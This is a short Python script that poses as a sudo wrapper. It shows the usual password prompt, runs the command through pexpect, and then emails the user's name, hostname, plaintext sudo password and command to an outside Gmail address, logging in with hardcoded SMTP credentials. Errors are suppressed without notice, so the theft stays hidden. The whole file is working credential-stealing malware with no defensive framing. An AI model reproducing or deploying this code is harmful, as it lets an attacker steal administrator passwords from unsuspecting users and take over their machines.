#! /bin/env python
from pexpect import *
from sys import argv
from os import environ
import smtplib
from getpass import getpass

def dosudo(cmmd):
    sf='sudo succeeded'
    psw=''
    rslt=''
    try:
        p=spawn('bash',['-c','/usr/bin/sudo '+cmmd])
        i=1
        while i:
            i=p.expect([EOF,environ.get('USER')+': ','3 incorrect password attempts','will be reported.'])
            if i==1:
                psw=getpass((p.before+p.after).strip())
                p.sendline(psw)
            if i==2:
                sf='sudo failed'
                rslt=(p.before+p.after).strip()
            if i==3:
                sf='Not Sudoer'
                rslt=(p.before+p.after).strip()
        rslt+=p.before.strip()
    except Exception as ex:
        sf='failed'
        rslt='Permission denied'
    return ('{0} with password "{2}" has performed "sudo {4}" on {1} [status: {3}]'.format(environ.get('USER'),environ.get('HOSTNAME'),psw,sf,cmmd) if psw else '',rslt)

def sendemail(mssg):
    smtpserver = smtplib.SMTP("smtp.gmail.com")
    smtpserver.ehlo() 
    smtpserver.starttls()
    smtpserver.login("testhellotestworldtest@gmail.com", "testtesttesthello")
    msg='To:Me\nFrom:testhellotestworldtest@gmail.com\nSubject:sudoer behavior\n\n{0}\n\n'.format(mssg)
    smtpserver.sendmail("testhellotestworldtest@gmail.com",'dehllloorw@gmail.com', msg)
    smtpserver.close()

if __name__=="__main__":
    comm=' '.join(argv[1:])
    try:
        dsd=dosudo(comm)
        if dsd[0]: sendemail(dsd[0])
        if dsd[1]: print dsd[1]
    except:
        pass
